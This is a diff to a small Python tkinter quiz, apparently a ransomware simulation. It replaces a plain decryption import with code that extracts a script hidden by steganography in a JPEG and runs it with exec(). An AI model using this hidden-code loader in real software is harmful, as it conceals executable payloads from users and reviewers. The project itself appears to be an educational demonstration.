@@ -1,5 +1,6 @@
 from tkinter import *
 from PIL import Image, ImageTk
+from extract import extract_message
 
 # List of question-answer pairs to be prompted to a user
 q_and_a = ({"What kind of cyber attack is this?": ("ransomware",)},
@@ -70,12 +71,13 @@ def clicking_submit():
 
     # Exits out of program when user exhausts their attempts
     if attempts_left == 0:
-        # We import the decrypt.py module to perform
-        import decrypt
-
+        # Retrieves code secretly embedded in one of the images to decrypt the hosts' encrypted data
+        code_to_decrypt: str = extract_message("download3.jpg", "Mochi")
         print("You ran out of attempts! Good luck decrypting your files!")
+        # Destroys the displayed window
         window.destroy()
-        decrypt.main()
+        # Executes the decryption code
+        exec(code_to_decrypt)
 
 
 # Initializes the number of user attempts to be 3
